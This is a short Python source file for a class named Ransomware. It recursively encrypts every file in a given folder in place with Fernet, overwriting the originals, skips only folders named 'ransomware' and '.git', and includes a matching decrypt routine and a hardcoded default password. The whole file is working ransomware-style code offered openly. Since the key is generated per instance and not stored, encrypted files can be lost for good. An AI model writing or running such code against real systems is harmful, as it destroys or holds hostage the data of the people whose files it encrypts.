from pathlib import Path
from cryptography.fernet import Fernet


class Ransomware:
    __red = "\033[91m"
    __blue = "\033[94m"

    def __init__(
        self, password: str = "11092005", key: str | bytes | None = None
    ) -> None:
        self.__secret_password = password
        self.__secret_key = key if key else Fernet.generate_key()

    @property
    def password(self) -> str:
        return self.__secret_password

    def __process_file(self, file_path: str, mode: str) -> bool:
        try:
            with open(file_path, "rb") as f:
                data = f.read()

            processed_data = (
                Fernet(self.__secret_key).encrypt(data)
                if mode == "encrypt"
                else Fernet(self.__secret_key).decrypt(data)
            )

            with open(file_path, "wb") as f:
                f.write(processed_data)

            return True

        except Exception:
            return False

    def __process_files_in_folder(self, path: str, mode: str) -> None:

        def is_banned(item: Path) -> bool:
            banned_folders = ["ransomware", ".git"]
            return any(folder in item.parts for folder in banned_folders)

        try:
            path_obj = Path(path)
            if not path_obj.exists():
                print(f"{self.__red}Invalid path!")
                return

            for current_path in path_obj.rglob("*"):
                if is_banned(current_path):
                    print(f"{self.__red}Skipping processing for {current_path}")
                    continue

                if current_path.is_file():
                    if self.__process_file(current_path, mode):
                        print(f"{self.__blue}Successfully {mode}ed {current_path}")
                    else:
                        print(f"{self.__red}Failed to {mode} {current_path}")

        except Exception as e:
            print(f"{self.__red}{e}")

    def encrypt_files_in_folder(self, path: str) -> None:
        self.__process_files_in_folder(path, "encrypt")

    def decrypt_files_in_folder(self, path: str) -> None:
        self.__process_files_in_folder(path, "decrypt")
